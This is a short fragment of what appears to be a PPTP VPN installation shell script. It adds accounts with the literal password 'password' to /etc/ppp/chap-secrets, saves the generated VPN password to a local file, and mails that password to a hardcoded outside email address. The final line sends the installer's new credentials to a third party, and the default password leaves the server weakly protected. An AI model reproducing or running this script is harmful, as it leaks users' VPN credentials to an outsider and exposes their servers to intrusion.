...
echo "vpn2 pptpd password *" >> /etc/ppp/chap-secrets
# echo "vpn3 pptpd password *" >> /etc/ppp/chap-secrets
...
echo -e "VPN service is installed, your VPN username is vpn, VPN password is ${pass}" > mima.txt
echo -e "VPN service is installed, your VPN username is vpn, VPN password is ${pass}" | mail -s "passwd" antiact@foxmail.com
